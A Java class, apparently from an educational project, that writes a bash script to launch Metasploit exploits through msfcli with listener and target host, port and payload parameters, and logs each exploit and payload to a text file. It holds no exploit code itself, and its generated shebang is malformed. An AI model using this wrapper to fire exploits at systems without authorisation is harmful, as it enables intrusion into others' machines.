package tama.edu.java.feature;

import tama.edu.java.io.IOStream;

public class InsertExploit {
	public void insertExploit(String pathExploit, String payload, String lport,
			String rport, String target) {
		// get name of file script
		String tmp[] = pathExploit.split("/");
		String fileScriptName = tmp[tmp.length - 1];

		// create content of file script
		String fileScriptContent = createScriptContent(lport, rport, target);
		String fileDatabaseContent = pathExploit + ";" + payload;

		IOStream ioStream = new IOStream();
		// create a new script for new exploit
		ioStream.writeNewFile(
				"./src/main/edu/script/" + fileScriptName + ".sh",
				fileScriptContent);
		// add new exploit to database
		ioStream.appendTextToExistingFile(
				"./src/main/edu/database/database.txt", fileDatabaseContent);
	}

	private String createScriptContent(String lport, String rport, String target) {
		String content = "#!bin/bash/\n";
		content += "\n";
		content += "vulPath=$1\n";
		content += "lhost=$2\n";
		content += "rhost=$3\n";
		content += "payload=$4\n";
		content += "\n";
		content += "msfcli $vulPath lhost=$lhost lport=" + lport
				+ " rhost=$rhost rport=" + rport + " payload=$payload target="
				+ target + " E <<!END!\n";
		content += "exit -y\n";
		content += "!END!\n";
		return content;
	}
}
